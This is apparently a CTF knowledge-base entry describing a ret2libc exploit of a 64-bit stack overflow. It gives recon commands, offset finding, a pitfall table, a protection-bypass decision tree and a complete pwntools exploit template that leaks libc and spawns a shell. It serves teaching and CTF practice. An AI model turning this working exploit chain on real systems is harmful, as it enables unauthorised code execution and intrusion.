# [seed] CTF Pwn: x64 Stack Overflow + ROP Chain Calling system

## Scenario classification
CTF / binary exploitation

## Target overview
A 64-bit ELF has an out-of-bounds `read()` write into a stack buffer. The binary has NX (non-executable stack) but no PIE and no stack canary. Use ROP gadgets to call libc's `system("/bin/sh")` and get a shell.

## Complete execution chain

1. Basic reconnaissance
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Look at main in IDA / Ghidra → `read(0, buf, 0x100)` but `buf` is only 0x40 bytes
3. Compute the overflow offset
   ```bash
   pwndbg> cyclic 200
   # feed it to the target program and check RSP after the crash
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. Without PIE, the PLT and GOT have fixed addresses
5. Stage one (no libc information): leak the contents of `puts@GOT` to compute the libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # return to main for a second exploitation
   ```
6. Receive the puts output and identify the libc version (query libc-database)
7. Stage two: build system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get the shell → cat flag

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The program crashes after the ROP call to system, no shell | The stack is not 16-byte aligned (Ubuntu 18.04+ is strict about movaps) | Add a ret gadget before system as padding | 30min |
| Works locally, fails remotely | Different libc versions | Leak a function address with puts → look up the exact version in libc-database | 40min |
| pwntools recv hangs | The program uses setbuf(NULL) for output, but the remote did not disable stderr buffering | Synchronize precisely with sendlineafter / recvuntil | 15min |
| SIGPIPE as soon as it hits the remote | The stage two payload still uses the previous round's io object | After `process` / `remote`, io must reuse the same connection; once the main process dies, it is over | 20min |
| ROPgadget outputs too much | The tool lists every gadget by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain findings

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10 times stronger than plain GDB (with cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper's output is friendlier and supports searching syscall chains
- **libc-database** matches the exact libc version from 1 leaked libc function address
- **one_gadget** finds a libc gadget that does execve("/bin/sh") directly, shorter than a manual ROP chain

## Key code/commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Improvement suggestions for this package

- `competition-reverse-pwn` in CTF-Sandbox-Orchestrator should add `pwn-rop-cheatsheet.md` that turns this flow into a template
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest

## Reusable patterns/script snippets

**ROP exploitation decision tree**:

```text
checksec → check the protections
├── no NX → shellcode directly (the old-school way)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no canary → leak the PIE base first → ret2libc
├── canary present → find a way to leak the canary first (format string / off-by-one)
└── Full RELRO + canary + PIE → hard; common techniques: fork does not re-randomize ASLR / __libc_start_main / SROP
```

**Standard two-stage payload for libc leak → exploitation**:

```text
Stage 1: leak puts@GOT → compute the libc base → back to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution actions
- [ ] Add a pwn quick reference page to the CTF orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to the bootstrap-manifest
- [ ] Reference this case from reverse-engineering/tools-dynamic.md

## Environment information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTFs)
- Target architecture: x86_64

## Redaction requirements
This entry is seed data, written from public CTF technical patterns, with no real challenge or closed-source system involved.
